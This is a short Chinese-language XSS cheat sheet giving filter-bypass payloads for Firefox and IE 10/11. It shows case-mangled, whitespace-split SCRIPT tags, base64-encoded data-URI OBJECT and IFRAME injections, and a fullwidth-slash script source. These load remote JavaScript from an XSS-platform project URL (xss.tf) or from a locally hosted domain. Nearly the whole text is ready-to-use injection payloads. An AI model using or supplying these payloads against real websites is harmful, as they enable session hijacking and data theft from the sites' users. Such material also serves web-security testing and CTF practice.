## 【Firefox 浏览器】 payload-1 （利用 XSS 平台）

XSS 平台推荐使用 [http://xss.tf](http://xss.tf) ，新建一个项目。 

自定义项目代码为 `prompt(1)` ，得到项目地址： `http://xss.tf/tOH` 

> 注：每个人的项目地址都是不同的，你需要找到在编码成 Base64 后是全大写的地址

```html
  <SCRIPT /
SRC  
= 
  
HTTPS:XSS%2E%54%46/TOH>
</SCRIPT
 >
```


```html
"><OBJECT/DATA="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=
```

```html
"><IFRAME/SRC="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6WFNTJTJFJTU0JTQ2L1RPSD4KPC9TQ1JJUFQKID4=
```

------

## 【Firefox 浏览器】 payload-2 （本地搭建 XSS 服务器）

本地 HTTP 服务器推荐使用 [Apache Httpd](https://httpd.apache.org/) 。 

自定义 index.js 页面代码为 `prompt(1)` ，得到 WEB 地址： `http://E.XP` 

> 注：需修改 hosts 文件配置本地 DNS ，令 127.0.0.1 映射到本地域名 E.XP

```html
  <SCRIPT /
SRC  
= 
  
HTTPS:E.XP>
</SCRIPT
 >
```

```html
"><OBJECT/DATA="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6RS5YUD4KPC9TQ1JJUFQKID4=
```

```html
"><IFRAME/SRC="data:TEXT/HTML;BASE64,ICA8U0NSSVBUIC8KU1JDICAKPSAKICAKSFRUUFM6RS5YUD4KPC9TQ1JJUFQKID4=
```


------

## 【IE 10/11 浏览器】 payload-3 （利用 XSS 平台）

XSS 平台推荐使用 [http://xss.tf](http://xss.tf) ，新建一个项目。 

自定义项目代码为 `prompt(1)` ，得到项目地址： `http://xss.tf/tOH` 

> 注：每个人的项目地址都是不同的

```html
"><script/async/src="/〳xss.tf/tOH
```

------